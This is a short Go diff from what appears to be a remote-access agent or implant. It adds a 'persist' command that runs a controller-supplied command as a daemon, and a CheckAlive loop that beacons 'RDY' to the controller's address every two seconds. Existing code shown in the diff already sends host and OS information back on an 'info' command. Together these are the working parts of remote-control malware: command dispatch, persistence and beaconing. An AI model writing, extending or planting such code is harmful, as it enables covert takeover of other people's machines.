@@ -307,7 +307,7 @@ func getAgentData() {
 		info.OsVersion = version
 	}
 	ser, err := json.Marshal(info)
-	WriteClient(string(ser))
+	WriteClient(string(ser) + "\n")
 }
 
 func byteToStr(b []int8) string {
@@ -320,6 +320,30 @@ func byteToStr(b []int8) string {
 		str[i] = uint8(b[i])
 	}
 	return string(str[:i])
+}
+
+func HandlePersistence(cmd string) {
+	StartDaemon(cmd)
+}
+
+func CheckAlive() {
+	ticker := time.NewTicker(2 * time.Second)
+	defer ticker.Stop()
+
+	for {
+		select {
+		case <-ticker.C:
+			go func() {
+				conn, err := net.Dial("tcp", Conf.Connection.RemoteAddr().String())
+				if err != nil {
+					fmt.Println(err)
+					return
+				}
+				defer conn.Close()
+				fmt.Fprintln(conn, "RDY")
+			}()
+		}
+	}
 }
 
 func HandleConnection(conn net.Conn) {
@@ -387,6 +411,8 @@ func HandleConnection(conn net.Conn) {
 			}()
 		case "info":
 			getAgentData()
+		case "persist":
+			HandlePersistence(parts[1])
 		default:
 			conn.Write([]byte("Error: unknown command\n"))
 		}
